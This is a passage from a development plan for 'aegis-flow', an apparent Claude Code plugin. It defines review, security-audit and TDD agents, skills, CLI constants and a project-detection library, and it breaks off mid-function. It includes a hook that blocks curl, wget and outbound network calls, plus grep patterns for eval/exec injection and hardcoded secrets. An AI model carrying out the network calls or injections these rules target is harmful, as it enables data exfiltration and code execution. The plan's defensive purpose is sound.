```bash
git add core/hooks/block-network.sh core/hooks/branch-protection.sh tests/hooks/
git commit -m "feat(core): add paranoid-level hooks

block-network: blocks curl, wget and outbound network calls
branch-protection: blocks push/commit to main/master"
```

---

### Task 5: Core agents (code-reviewer, security-auditor, tdd-runner)

Pure Markdown files — no code tests, but the content must be precise and actionable.

**Files:**
- Create: `core/agents/code-reviewer.md`
- Create: `core/agents/security-auditor.md`
- Create: `core/agents/tdd-runner.md`

- [ ] **Step 1: Write code-reviewer.md**

Create `core/agents/code-reviewer.md`:

```markdown
---
name: code-reviewer
description: Reviews code for patterns, security, complexity, and missing tests. Read-only.
tools:
  - Read
  - Grep
  - Glob
subagent_type: general-purpose
---

# Code Reviewer Agent

You are a senior code reviewer. Your job is to review code changes and produce a structured report.

## Input

You receive either:
- A git diff range (default: uncommitted changes)
- A specific directory or file path
- A PR number

## Process

1. **Gather changes:** Use `git diff` (or `git diff` against base branch for PRs) to identify modified files.
2. **Read each file** in full to understand context — don't review diffs in isolation.
3. **Analyze** each change against the checklist below.
4. **Produce** a structured report.

## Review Checklist

### Code Quality
- Functions over 50 lines → suggest splitting
- Deep nesting (>3 levels) → suggest early returns or extraction
- Duplicated logic → suggest DRY refactoring
- Magic numbers/strings → suggest named constants
- Dead code or commented-out code → flag for removal

### Security
- Hardcoded secrets, API keys, tokens
- SQL string concatenation (injection risk)
- User input used without sanitization
- Insecure randomness (`Math.random()` for security)
- Missing CSRF/XSS protections in web handlers

### Testing
- New functions without corresponding tests
- Modified logic without updated tests
- Missing edge case coverage (null, empty, boundary values)

### Naming & Clarity
- Variable/function names that don't describe purpose
- Misleading names (e.g., `getData` that also writes)
- Inconsistent naming conventions within the file

## Output Format

Return a structured report:

```
## Code Review Report

**Files reviewed:** N files
**Findings:** N critical, N warnings, N info

### Critical
- **[file:line]** [finding description] — [suggestion]

### Warning
- **[file:line]** [finding description] — [suggestion]

### Info
- **[file:line]** [finding description] — [suggestion]

### Summary
[1-2 sentence overall assessment]
```

## Rules
- Be specific: always reference file and line number
- Be actionable: every finding must have a concrete suggestion
- Be proportionate: don't flag style issues as critical
- Never modify files — you are read-only
```

- [ ] **Step 2: Write security-auditor.md**

Create `core/agents/security-auditor.md`:

```markdown
---
name: security-auditor
description: Transversal security audit — OWASP top 10, secrets, deps, injections. Read-only.
tools:
  - Read
  - Grep
  - Glob
subagent_type: general-purpose
---

# Security Auditor Agent

You are a security engineer performing a static analysis audit. Your job is to find vulnerabilities and produce a structured report.

## Process

1. **Discover attack surface:** Glob for entry points — API routes, CLI handlers, form processors, database queries, auth flows.
2. **Check each category** from the checklist below.
3. **Grep patterns** for known vulnerability indicators.
4. **Produce** findings as a structured JSON report.

## Audit Checklist

### Injection (OWASP A03)
- Grep for: string concatenation in SQL (`"SELECT.*" +`, `f"SELECT`, template literals with SQL)
- Grep for: `eval(`, `exec(`, `Function(`, `child_process.exec` with user input
- Grep for: unescaped HTML output (`innerHTML`, `dangerouslySetInnerHTML`, `|safe`)

### Broken Authentication (OWASP A07)
- Grep for: hardcoded passwords, default credentials
- Check: password hashing (bcrypt/argon2 vs md5/sha1)
- Check: session management (secure cookies, expiration)

### Sensitive Data Exposure (OWASP A02)
- Grep for: API keys, tokens, passwords in source (`(?i)(api.?key|secret|password|token)\s*[:=]`)
- Check: `.env` in `.gitignore`
- Check: HTTPS enforcement
- Grep for: console.log/print of sensitive data

### Broken Access Control (OWASP A01)
- Check: auth middleware on protected routes
- Check: authorization checks (not just authentication)
- Check: CORS configuration

### Security Misconfiguration (OWASP A05)
- Check: debug mode in production configs
- Check: default ports/credentials
- Check: verbose error messages exposing internals

### Vulnerable Dependencies
- Check: `package.json` / `requirements.txt` for known vulnerable versions
- Check: lockfile presence

## Output

Write findings to `.claude/aegis-flow-security.json`:

```json
{
  "timestamp": "2026-03-25T10:00:00Z",
  "findings": [
    {
      "severity": "critical",
      "category": "injection",
      "file": "src/api/users.ts",
      "line": 42,
      "description": "SQL string concatenation with user input",
      "recommendation": "Use parameterized queries"
    }
  ],
  "summary": {
    "critical": 1,
    "high": 0,
    "medium": 2,
    "low": 3,
    "info": 1
  }
}
```

## Rules
- Never modify files — you are read-only
- Severity levels: critical (exploitable now), high (likely exploitable), medium (needs specific conditions), low (defense-in-depth), info (best practice)
- No false positive padding — only report real findings
```

- [ ] **Step 3: Write tdd-runner.md**

Create `core/agents/tdd-runner.md`:

```markdown
---
name: tdd-runner
description: TDD cycle — writes tests first, then implementation, then refactor.
tools:
  - Read
  - Write
  - Edit
  - Bash
  - Grep
  - Glob
subagent_type: general-purpose
---

# TDD Runner Agent

You implement features using strict Test-Driven Development: Red → Green → Refactor.

## Input

You receive either:
- A feature description (e.g., "user login should validate email format")
- A `--fix` flag with failing test output

## Process

### Mode: New Feature

1. **Understand** the feature by reading related code and tests.
2. **Red:** Write a failing test that describes the expected behavior.
   - Run it. Confirm it fails for the right reason.
3. **Green:** Write the minimal implementation to make the test pass.
   - Run it. Confirm it passes.
   - Do NOT write more code than needed to pass the test.
4. **Refactor:** Clean up while keeping tests green.
   - Run tests after refactoring.
5. **Repeat** for additional test cases (edge cases, error paths).
6. **Commit** when the feature is complete and all tests pass.

### Mode: Fix (`--fix`)

1. **Read** the failing test output.
2. **Read** the test file and the implementation file.
3. **Diagnose** the root cause.
4. **Fix** the implementation (not the test, unless the test is wrong).
5. **Run** tests to confirm the fix.
6. **Check** for related edge cases that might also be broken.

## Test Design Principles

- One assertion per test (or one logical assertion group)
- Test names describe behavior: `"should reject email without @"`
- Test the interface, not the implementation
- Cover: happy path, edge cases, error cases
- Use the project's existing test runner and patterns

## Commit Convention

```
test: add tests for <feature>
feat: implement <feature>
refactor: clean up <feature> implementation
```

## Rules
- NEVER write implementation before the test
- NEVER skip the "verify it fails" step
- NEVER write more code than needed to pass the current test
- If a test is hard to write, the design is probably wrong — simplify first
```

- [ ] **Step 4: Commit**

```bash
git add core/agents/
git commit -m "feat(core): add code-reviewer, security-auditor, tdd-runner agents

code-reviewer: structured code review with severity levels
security-auditor: OWASP-based static analysis, outputs JSON report
tdd-runner: strict Red-Green-Refactor TDD cycle"
```

---

### Task 6: Core skills (review, secure, test, doctor)

**Files:**
- Create: `core/skills/review/SKILL.md`
- Create: `core/skills/secure/SKILL.md`
- Create: `core/skills/test/SKILL.md`
- Create: `core/skills/doctor/SKILL.md`

- [ ] **Step 1: Write review skill**

Create `core/skills/review/SKILL.md`:

```markdown
---
name: review
description: Code review — reviews modified files, a directory, or a PR for quality, security, and missing tests.
---

# /review

Run a code review on the current changes, a directory, or a pull request.

## Usage

- `/review` — review uncommitted changes (git diff)
- `/review src/auth/` — review a specific directory
- `/review --pr 42` — review a pull request

## Process

1. **Parse arguments:**
   - No args → use `git diff` to find modified files
   - Path arg → scope to that directory
   - `--pr N` → use `git diff main...HEAD` or fetch PR diff

2. **Dispatch** the `code-reviewer` agent with the scope.

3. **Present** the report to the user with a summary.

## Agent Dispatch

```
Agent:
  subagent_type: general-purpose
  name: code-reviewer
  description: "Review code changes"
  prompt: |
    Review the following code changes.
    Scope: {scope}

    Follow the instructions in your agent definition (code-reviewer.md).
    Return the structured report.
```
```

- [ ] **Step 2: Write secure skill**

Create `core/skills/secure/SKILL.md`:

```markdown
---
name: secure
description: Security audit — scans the project or a specific path for vulnerabilities using OWASP methodology.
---

# /secure

Run a security audit on the project or a specific path.

## Usage

- `/secure` — full project audit
- `/secure src/api/` — audit a specific directory

## Process

1. **Parse arguments:**
   - No args → full project scan
   - Path arg → scoped scan

2. **Dispatch** the `security-auditor` agent with the scope.

3. **Present** findings summary to the user.

4. **Report** is saved to `.claude/aegis-flow-security.json`.

## Agent Dispatch

```
Agent:
  subagent_type: general-purpose
  name: security-auditor
  description: "Security audit"
  prompt: |
    Perform a security audit on this project.
    Scope: {scope}

    Follow the instructions in your agent definition (security-auditor.md).
    Write your findings to .claude/aegis-flow-security.json.
```
```

- [ ] **Step 3: Write test skill**

Create `core/skills/test/SKILL.md`:

```markdown
---
name: test
description: TDD workflow — implement features test-first, or fix failing tests.
---

# /test

Implement a feature using TDD, or fix failing tests.

## Usage

- `/test "user login should validate email"` — TDD for a new feature
- `/test --fix` — fix currently failing tests

## Process

### New Feature Mode

1. **Parse** the feature description from the argument.
2. **Dispatch** the `tdd-runner` agent with the feature description.
3. **Present** the result: tests written, implementation done, all green.

### Fix Mode

1. **Run** the test suite to capture current failures.
2. **Dispatch** the `tdd-runner` agent with `--fix` and the failure output.
3. **Present** the result: what was broken, what was fixed.

## Agent Dispatch

```
Agent:
  subagent_type: general-purpose
  name: tdd-runner
  description: "TDD implementation"
  prompt: |
    Mode: {mode}
    Feature: {description}

    Follow the instructions in your agent definition (tdd-runner.md).
```
```

- [ ] **Step 4: Write doctor skill**

Create `core/skills/doctor/SKILL.md`:

```markdown
---
name: doctor
description: Diagnostic — verifies aegis-flow setup health, hooks, config, and module consistency.
---

# /doctor

Run a health check on the aegis-flow setup.

## Usage

- `/doctor` — full diagnostic

## Process (no agent dispatch — run directly)

1. **Check aegis-flow.json exists** in `.claude/`:
   - Read and validate JSON structure
   - Check required fields: `version`, `security`, `modules`, `project`
   - Report: ✓ Config valid / ✗ Config missing or invalid

2. **Check settings.json exists** in `.claude/`:
   - Read and verify hooks are configured
   - Cross-check hooks match the security level in `aegis-flow.json`
   - Report: ✓ Hooks configured / ✗ Hooks missing or mismatched

3. **Check hook scripts exist:**
   - For each hook referenced in settings.json, verify the script file exists
   - Report: ✓ All hook scripts present / ✗ Missing scripts

4. **Check enabled modules:**
   - For each module in `aegis-flow.json`, verify its directory exists under `modules/`
   - Verify its agents and skills are referenced in `plugin.json`
   - Report: ✓ Modules consistent / ✗ Module mismatch

5. **Check project detection:**
   - Verify formatter exists if configured (e.g., `npx prettier --version`)
   - Verify test runner exists if configured (e.g., `npx vitest --version`)
   - Report: ✓ Tools detected / ✗ Tools not found

6. **Summary:**
   ```
   aegis-flow doctor

   ✓ Config:     .claude/aegis-flow.json valid (strict mode)
   ✓ Hooks:      5/5 hooks active, scripts present
   ✓ Modules:    ticket-pilot enabled, files present
   ✓ Formatter:  prettier (v3.2.0)
   ✓ Test runner: vitest (v1.6.0)

   Status: healthy
   ```
```

- [ ] **Step 5: Commit**

```bash
git add core/skills/
git commit -m "feat(core): add review, secure, test, doctor skills

/review: code review via code-reviewer agent
/secure: security audit via security-auditor agent
/test: TDD workflow via tdd-runner agent
/doctor: health check of aegis-flow setup"
```

---

### Task 7: Plugin manifest and constants

**Files:**
- Create: `.claude-plugin/plugin.json`
- Create: `cli/src/constants.js`

- [ ] **Step 1: Create the plugin manifest**

Create `.claude-plugin/plugin.json`:

```json
{
  "name": "aegis-flow",
  "version": "1.0.0",
  "description": "Professional AI workflow — secure, tested, production-ready",
  "repository": "https://github.com/nmarijane/aegis-flow",
  "license": "MIT",
  "keywords": ["workflow", "security", "code-quality", "tdd", "hooks", "agents"],
  "agents": [
    { "name": "code-reviewer",    "path": "./core/agents/code-reviewer.md" },
    { "name": "security-auditor", "path": "./core/agents/security-auditor.md" },
    { "name": "tdd-runner",       "path": "./core/agents/tdd-runner.md" },
    { "name": "bot-builder",      "path": "./modules/crypto-forge/agents/bot-builder.md" },
    { "name": "contract-builder", "path": "./modules/crypto-forge/agents/contract-builder.md" },
    { "name": "dapp-builder",     "path": "./modules/crypto-forge/agents/dapp-builder.md" },
    { "name": "auditor",          "path": "./modules/crypto-forge/agents/auditor.md" },
    { "name": "saas-builder",     "path": "./modules/saas-forge/agents/saas-builder.md" },
    { "name": "resolver",         "path": "./modules/ticket-pilot/agents/resolver.md" },
    { "name": "triager",          "path": "./modules/ticket-pilot/agents/triager.md" },
    { "name": "moderator",        "path": "./modules/ticket-pilot/agents/moderator.md" }
  ],
  "skills": "./core/skills/",
  "modules": {
    "crypto-forge": { "skills": "./modules/crypto-forge/skills/" },
    "saas-forge":   { "skills": "./modules/saas-forge/skills/" },
    "ticket-pilot": { "skills": "./modules/ticket-pilot/skills/" }
  }
}
```

- [ ] **Step 2: Create constants.js**

Create `cli/src/constants.js`:

```javascript
// aegis-flow CLI constants

export const SECURITY_LEVELS = {
  standard: {
    label: 'standard',
    description: 'Block secrets, protect lockfiles, auto-format',
    hooks: ['block-secrets', 'protect-lockfiles', 'auto-format']
  },
  strict: {
    label: 'strict (recommended)',
    description: '+ Command validation, test verification, audit log',
    hooks: ['block-secrets', 'protect-lockfiles', 'auto-format', 'validate-commands', 'verify-tests', 'audit-log']
  },
  paranoid: {
    label: 'paranoid',
    description: '+ Network blocking, approval required, branch protection',
    hooks: ['block-secrets', 'protect-lockfiles', 'auto-format', 'validate-commands', 'verify-tests', 'audit-log', 'block-network', 'branch-protection']
  }
};

export const HOOK_DEFINITIONS = {
  'block-secrets': {
    event: 'PreToolUse',
    matcher: 'Edit|Write',
    script: 'block-secrets.sh'
  },
  'protect-lockfiles': {
    event: 'PreToolUse',
    matcher: 'Edit|Write',
    script: 'protect-lockfiles.sh'
  },
  'auto-format': {
    event: 'PostToolUse',
    matcher: 'Edit|Write',
    script: 'auto-format.sh'
  },
  'validate-commands': {
    event: 'PreToolUse',
    matcher: 'Bash',
    script: 'validate-commands.sh'
  },
  'verify-tests': {
    event: 'Stop',
    matcher: '',
    script: 'verify-tests.sh'
  },
  'audit-log': {
    event: 'PostToolUse',
    matcher: '',
    script: 'audit-log.sh'
  },
  'block-network': {
    event: 'PreToolUse',
    matcher: 'Bash',
    script: 'block-network.sh'
  },
  'branch-protection': {
    event: 'PreToolUse',
    matcher: 'Bash',
    script: 'branch-protection.sh'
  }
};

export const MODULES = {
  'crypto-forge': {
    description: 'Crypto/blockchain development — bots, DApps, smart contracts',
    agents: ['bot-builder', 'contract-builder', 'dapp-builder', 'auditor'],
    skills: './modules/crypto-forge/skills/'
  },
  'saas-forge': {
    description: 'SaaS project scaffolder — brainstorm and generate full-stack apps',
    agents: ['saas-builder'],
    skills: './modules/saas-forge/skills/'
  },
  'ticket-pilot': {
    description: 'Issue tracker integration — resolve, triage, and manage tickets',
    agents: ['resolver', 'triager', 'moderator'],
    skills: './modules/ticket-pilot/skills/'
  }
};

export const FORMATTERS = {
  prettier: { detect: ['prettier'], command: 'npx prettier --write' },
  biome: { detect: ['@biomejs/biome'], command: 'npx biome format --write' },
  black: { detect: ['black'], command: 'black' },
  rustfmt: { detect: ['rustfmt'], command: 'rustfmt' }
};

export const TEST_RUNNERS = {
  vitest: { detect: ['vitest'], command: 'npx vitest run' },
  jest: { detect: ['jest'], command: 'npx jest' },
  pytest: { detect: ['pytest'], command: 'pytest' },
  mocha: { detect: ['mocha'], command: 'npx mocha' },
  rspec: { detect: ['rspec'], command: 'bundle exec rspec' }
};

export const PACKAGE_MANAGERS = ['pnpm', 'yarn', 'npm', 'bun'];
```

- [ ] **Step 3: Commit**

```bash
git add .claude-plugin/plugin.json cli/src/constants.js
git commit -m "feat: add plugin manifest and CLI constants

plugin.json: declares all agents and skill directories
constants.js: security levels, hook definitions, module registry"
```

---

### Task 8: CLI — project detection library

**Files:**
- Create: `cli/src/lib/detect.js`
- Create: `cli/tests/detect.test.js`
- Create: `cli/package.json`

- [ ] **Step 1: Initialize the CLI package**

Create `cli/package.json`:

```json
{
  "name": "aegis-flow",
  "version": "1.0.0",
  "description": "Professional AI workflow — secure, tested, production-ready",
  "type": "module",
  "bin": {
    "aegis-flow": "./bin/aegis-flow.js"
  },
  "scripts": {
    "test": "vitest run",
    "test:watch": "vitest"
  },
  "keywords": ["claude-code", "workflow", "security", "ai"],
  "license": "MIT",
  "dependencies": {
    "@inquirer/prompts": "^7.0.0",
    "commander": "^13.0.0"
  },
  "devDependencies": {
    "vitest": "^3.0.0"
  }
}
```

- [ ] **Step 2: Install dependencies**

```bash
cd cli && npm install && cd ..
```

- [ ] **Step 3: Write the test for detect.js**

Create `cli/tests/detect.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { detectProject } from '../src/lib/detect.js';
import { existsSync, readFileSync } from 'fs';

vi.mock('fs');

describe('detectProject', () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it('detects TypeScript from tsconfig.json', () => {
    existsSync.mockImplementation(path => path.endsWith('tsconfig.json'));
    readFileSync.mockReturnValue('{}');
    const result = detectProject('/app');
    expect(result.language).toBe('typescript');
  });

  it('detects JavaScript when no tsconfig', () => {
    existsSync.mockImplementation(path => path.endsWith('package.json'));
    readFileSync.mockReturnValue('{}');
    const result = detectProject('/app');
    expect(result.language).toBe('javascript');
  });

  it('detects Python from requirements.txt', () => {
    existsSync.mockImplementation(path =>
      path.endsWith('requirements.txt') || path.endsWith('pyproject.toml')
    );
    readFileSync.mockReturnValue('');
    const result = detectProject('/app');
    expect(result.language).toBe('python');
  });

  it('detects pnpm from pnpm-lock.yaml', () => {
    existsSync.mockImplementation(path =>
      path.endsWith('pnpm-lock.yaml') || path.endsWith('package.json')
    );
    readFileSync.mockReturnValue('{}');
    const result = detectProject('/app');
    expect(result.packageManager).toBe('pnpm');
  });

  it('detects vitest from package.json devDependencies', () => {
    existsSync.mockImplementation(path => path.endsWith('package.json'));
    readFileSync.mockReturnValue(JSON.stringify({
      devDependencies: { vitest: '^3.0.0', prettier: '^3.0.0' }
    }));
    const result = detectProject('/app');
    expect(result.testRunner).toBe('vitest');
    expect(result.formatter).toBe('prettier');
  });

  it('detects Next.js framework', () => {
    existsSync.mockImplementation(path =>
      path.endsWith('package.json') || path.endsWith('tsconfig.json')
    );
    readFileSync.mockImplementation(path => {
      if (path.endsWith('package.json')) {
        return JSON.stringify({ dependencies: { next: '^15.0.0' } });
      }
      return '{}';
    });
    const result = detectProject('/app');
    expect(result.framework).toBe('nextjs');
  });

  it('returns unknown for unrecognized project', () => {
    existsSync.mockReturnValue(false);
    const result = detectProject('/app');
    expect(result.language).toBe('unknown');
  });
});
```

- [ ] **Step 4: Run test to verify it fails**

```bash
cd cli && npx vitest run tests/detect.test.js && cd ..
```

Expected: FAIL — `detect.js` doesn't exist.

- [ ] **Step 5: Write detect.js**

Create `cli/src/lib/detect.js`:

```javascript
import { existsSync, readFileSync } from 'fs';
import { join } from 'path';

export function detectProject(projectDir) {
  const result = {
    language: 'unknown',
    framework: '',
    packageManager: '',
    testRunner: '',
    formatter: ''
  };

  // Read package.json if exists
  let pkg = {};
  const pkgPath = join(projectDir, 'package.json');
  if (existsSync(pkgPath)) {
    try { pkg = JSON.parse(readFileSync(pkgPath, 'utf-8')); } catch {}
  }

  const allDeps = { ...pkg.dependencies, ...pkg.devDependencies };

  // Detect language
  if (existsSync(join(projectDir, 'tsconfig.json'))) {
    result.language = 'typescript';
  } else if (existsSync(join(projectDir, 'package.json'))) {
    result.language = 'javascript';
  } else if (existsSync(join(projectDir, 'requirements.txt')) || existsSync(join(projectDir, 'pyproject.toml'))) {
    result.language = 'python';
  } else if (existsSync(join(projectDir, 'go.mod'))) {
    result.language = 'go';
  } else if (existsSync(join(projectDir, 'Cargo.toml'))) {
    result.language = 'rust';
  } else if (existsSync(join(projectDir, 'Gemfile'))) {
    result.language = 'ruby';
  }

  // Detect package manager
  if (existsSync(join(projectDir, 'pnpm-lock.yaml'))) {
    result.packageManager = 'pnpm';
  } else if (existsSync(join(projectDir, 'yarn.lock'))) {
    result.packageManager = 'yarn';
  } else if (existsSync(join(projectDir, 'bun.lockb'))) {
    result.packageManager = 'bun';
  } else if (existsSync(join(projectDir, 'package-lock.json'))) {
    result.packageManager = 'npm';
  }

  // Detect framework
  if (allDeps.next) result.framework = 'nextjs';
  else if (allDeps.nuxt) result.framework = 'nuxt';
  else if (allDeps.react) result.framework = 'react';
  else if (allDeps.vue) result.framework = 'vue';
  else if (allDeps.svelte || allDeps['@sveltejs/kit']) result.framework = 'svelte';
  else if (allDeps.express) result.framework = 'express';
  else if (allDeps.fastify) result.framework = 'fastify';

  // Detect test runner
  if (allDeps.vitest) result.testRunner = 'vitest';
  else if (allDeps.jest) result.testRunner = 'jest';
  else if (allDeps.mocha) result.testRunner = 'mocha';
  else if (result.language === 'python') result.testRunner = 'pytest';
  else if (result.language === 'ruby') result.testRunner = 'rspec';

  // Detect formatter
  if (allDeps.prettier) result.formatter = 'prettier';
  else if (allDeps['@biomejs/biome']) result.formatter = 'biome';
  else if (result.language === 'python') result.formatter = 'black';
  else if (result.language === 'rust') result.formatter = 'rustfmt';

  return result;
}
```

- [ ] **Step 6: Run test to verify it passes**

```bash
cd cli && npx vitest run tests/detect.test.js && cd ..
```

Expected: all 7 tests PASS.

- [ ] **Step 7: Commit**

```bash
git add cli/package.json cli/package-lock.json cli/src/lib/detect.js cli/tests/detect.test.js
git commit -m "feat(cli): add project detection library

Detects language, framework, package manager, test runner, and formatter
from project files and package.json dependencies."
```

---

### Task 9: CLI — config and hooks generation libraries

**Files:**
- Create: `cli/src/lib/config.js`
- Create: `cli/src/lib/hooks.js`
- Create: `cli/src/lib/manifest.js`
- Create: `cli/src/lib/plugin.js`
- Create: `cli/tests/config.test.js`
- Create: `cli/tests/hooks.test.js`
- Create: `cli/tests/manifest.test.js`

- [ ] **Step 1: Write the test for config.js**

Create `cli/tests/config.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import { buildConfig, validateConfig } from '../src/lib/config.js';

describe('buildConfig', () => {
  it('builds config from detection and user choices', () => {
    const config = buildConfig({
      project: { language: 'typescript', framework: 'nextjs', packageManager: 'pnpm', testRunner: 'vitest', formatter: 'prettier' },
      security: 'strict',
      modules: ['ticket-pilot']
    });
    expect(config.version).toBe('1.0.0');
    expect(config.security).toBe('strict');
    expect(config.modules).toEqual(['ticket-pilot']);
    expect(config.project.language).toBe('typescript');
  });
});

describe('validateConfig', () => {
  it('returns valid for correct config', () => {
    const result = validateConfig({
      version: '1.0.0', security: 'strict', modules: [],
      project: { language: 'typescript' }
    });
    expect(result.valid).toBe(true);
  });

  it('returns invalid for missing version', () => {
    const result = validateConfig({ security: 'strict', modules: [] });
    expect(result.valid).toBe(false);
  });

  it('returns invalid for unknown security level', () => {
    const result = validateConfig({ version: '1.0.0', security: 'ultra', modules: [] });
    expect(result.valid).toBe(false);
  });
});
```

- [ ] **Step 2: Write config.js**

Create `cli/src/lib/config.js`:

```javascript
import { readFileSync, writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';

export function buildConfig({ project, security, modules }) {
  return {
    version: '1.0.0',
    security,
    modules,
    project
  };
}

export function validateConfig(config) {
  const errors = [];
  if (!config.version) errors.push('missing version');
  if (!['standard', 'strict', 'paranoid'].includes(config.security)) {
    errors.push(`unknown security level: ${config.security}`);
  }
  if (!Array.isArray(config.modules)) errors.push('modules must be an array');
  return { valid: errors.length === 0, errors };
}

export function writeConfig(projectDir, config) {
  const claudeDir = join(projectDir, '.claude');
  mkdirSync(claudeDir, { recursive: true });
  writeFileSync(
    join(claudeDir, 'aegis-flow.json'),
    JSON.stringify(config, null, 2) + '\n'
  );
}

export function readConfig(projectDir) {
  const configPath = join(projectDir, '.claude', 'aegis-flow.json');
  return JSON.parse(readFileSync(configPath, 'utf-8'));
}
```

- [ ] **Step 3: Run test**

```bash
cd cli && npx vitest run tests/config.test.js && cd ..
```

Expected: all tests PASS.

- [ ] **Step 4: Write the test for hooks.js**

Create `cli/tests/hooks.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import { generateHooksConfig } from '../src/lib/hooks.js';

describe('generateHooksConfig', () => {
  it('generates standard hooks', () => {
    const hooks = generateHooksConfig('standard', '/path/to/aegis-flow');
    expect(hooks.PreToolUse).toHaveLength(1); // block-secrets + protect-lockfiles merged
    expect(hooks.PostToolUse).toHaveLength(1); // auto-format
    expect(hooks.Stop).toBeUndefined();
  });

  it('generates strict hooks', () => {
    const hooks = generateHooksConfig('strict', '/path/to/aegis-flow');
    expect(hooks.PreToolUse).toHaveLength(2); // Edit|Write + Bash matchers
    expect(hooks.PostToolUse).toHaveLength(2); // auto-format + audit-log
    expect(hooks.Stop).toHaveLength(1);
  });

  it('generates paranoid hooks', () => {
    const hooks = generateHooksConfig('paranoid', '/path/to/aegis-flow');
    const bashHooks = hooks.PreToolUse.find(h => h.matcher === 'Bash');
    expect(bashHooks.hooks.length).toBeGreaterThanOrEqual(3); // validate + block-network + branch-protection
  });
});
```

- [ ] **Step 5: Write hooks.js**

Create `cli/src/lib/hooks.js`:

```javascript
import { SECURITY_LEVELS, HOOK_DEFINITIONS } from '../constants.js';

export function generateHooksConfig(securityLevel, pluginDir) {
  const level = SECURITY_LEVELS[securityLevel];
  if (!level) throw new Error(`Unknown security level: ${securityLevel}`);

  // Group hooks by event+matcher
  const grouped = {};

  for (const hookName of level.hooks) {
    const def = HOOK_DEFINITIONS[hookName];
    const key = `${def.event}::${def.matcher}`;
    if (!grouped[key]) {
      grouped[key] = { event: def.event, matcher: def.matcher, hooks: [] };
    }
    grouped[key].hooks.push({
      type: 'command',
      command: `bash "${pluginDir}/core/hooks/${def.script}"`
    });
  }

  // Build the settings.json hooks structure
  const result = {};

  for (const group of Object.values(grouped)) {
    if (!result[group.event]) result[group.event] = [];
    const entry = { hooks: group.hooks };
    if (group.matcher) entry.matcher = group.matcher;
    result[group.event].push(entry);
  }

  return result;
}
```

- [ ] **Step 6: Run test**

```bash
cd cli && npx vitest run tests/hooks.test.js && cd ..
```

Expected: all tests PASS.

- [ ] **Step 7: Write manifest.js**

Create `cli/src/lib/manifest.js`:

```javascript
import { readFileSync, writeFileSync } from 'fs';
import { join } from 'path';
import { MODULES } from '../constants.js';

export function generateManifest(pluginDir, enabledModules) {
  const manifestPath = join(pluginDir, '.claude-plugin', 'plugin.json');
  const manifest = JSON.parse(readFileSync(manifestPath, 'utf-8'));

  // Always include core agents
  const agents = manifest.agents.filter(a =>
    ['code-reviewer', 'security-auditor', 'tdd-runner'].includes(a.name)
  );

  // Add agents from enabled modules
  for (const modName of enabledModules) {
    const mod = MODULES[modName];
    if (!mod) continue;
    const modAgents = manifest.agents.filter(a => mod.agents.includes(a.name));
    agents.push(...modAgents);
  }

  // Build modules section
  const modules = {};
  for (const modName of enabledModules) {
    const mod = MODULES[modName];
    if (!mod) continue;
    modules[modName] = { skills: mod.skills };
  }

  return {
    ...manifest,
    agents,
    modules
  };
}
```

- [ ] **Step 8: Write plugin.js**

Create `cli/src/lib/plugin.js`:

```javascript
import { readFileSync, writeFileSync } from 'fs';
import { join } from 'path';

export function installPlugin(projectDir, pluginDir) {
  // Add plugin path to .claude/settings.json
  const settingsPath = join(projectDir, '.claude', 'settings.json');
  let settings = {};
  try {
    settings = JSON.parse(readFileSync(settingsPath, 'utf-8'));
  } catch {}

  if (!settings.plugins) settings.plugins = [];

  // Avoid duplicates
  if (!settings.plugins.includes(pluginDir)) {
    settings.plugins.push(pluginDir);
  }

  writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + '\n');
}
```

- [ ] **Step 9: Commit**

```bash
cd cli && cd .. && git add cli/src/lib/ cli/tests/
git commit -m "feat(cli): add config, hooks, manifest, and plugin libraries

config.js: build/validate/read/write aegis-flow.json
hooks.js: generate settings.json hooks from security level
manifest.js: generate plugin.json with enabled modules
plugin.js: install plugin path into settings.json"
```

---

### Task 10: CLI — init command

**Files:**
- Create: `cli/src/commands/init.js`
- Create: `cli/bin/aegis-flow.js`
- Create: `cli/tests/init.test.js`

- [ ] **Step 1: Write init.test.js**

Create `cli/tests/init.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { runInit } from '../src/commands/init.js';
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'fs';

vi.mock('fs');
vi.mock('@inquirer/prompts');

describe('runInit', () => {
  beforeEach(() => {
    vi.resetAllMocks();
    mkdirSync.mockReturnValue(undefined);
    writeFileSync.mockReturnValue(undefined);
  });

  it('writes aegis-flow.json with detected project info', async () => {
    const { select, checkbox, confirm } = await import('@inquirer/prompts');

    // Mock project detection
    existsSync.mockImplementation(path => {
      if (path.endsWith('package.json')) return true;
      if (path.endsWith('tsconfig.json')) return true;
      return false;
    });
    readFileSync.mockReturnValue(JSON.stringify({
      devDependencies: { vitest: '^3.0.0', prettier: '^3.0.0' }
    }));

    // Mock user choices
    confirm.mockResolvedValue(true); // confirm detection
    select.mockResolvedValue('strict');
    checkbox.mockResolvedValue(['ticket-pilot']);

    await runInit('/app', '/path/to/aegis-flow');

    // Verify aegis-flow.json was written
    const writeCalls = writeFileSync.mock.calls;
    const configWrite = writeCalls.find(c => c[0].endsWith('aegis-flow.json'));
    expect(configWrite).toBeDefined();
    const config = JSON.parse(configWrite[1]);
    expect(config.security).toBe('strict');
    expect(config.modules).toEqual(['ticket-pilot']);
  });
});
```

- [ ] **Step 2: Write init.js**

Create `cli/src/commands/init.js`:

```javascript
import { select, checkbox, confirm } from '@inquirer/prompts';
import { detectProject } from '../lib/detect.js';
import { buildConfig, writeConfig } from '../lib/config.js';
import { generateHooksConfig } from '../lib/hooks.js';
import { generateManifest } from '../lib/manifest.js';
import { installPlugin } from '../lib/plugin.js';
import { SECURITY_LEVELS, MODULES } from '../constants.js';
import { readFileSync, writeFileSync, mkdirSync } from 'fs';
import { join } from 'path';

export async function runInit(projectDir, pluginDir) {
  console.log('\n🛡️  aegis-flow — Professional AI Workflow\n');

  // Step 1: Detect project
  console.log('Detecting project...');
  const project = detectProject(projectDir);

  console.log(`  Language:        ${project.language}`);
  console.log(`  Framework:       ${project.framework || '(none)'}`);
  console.log(`  Package manager: ${project.packageManager || '(none)'}`);
  console.log(`  Test runner:     ${project.testRunner || '(none)'}`);
  console.log(`  Formatter:       ${project.formatter || '(none)'}`);

  const detectionOk = await confirm({ message: 'Looks right?', default: true });
  if (!detectionOk) {
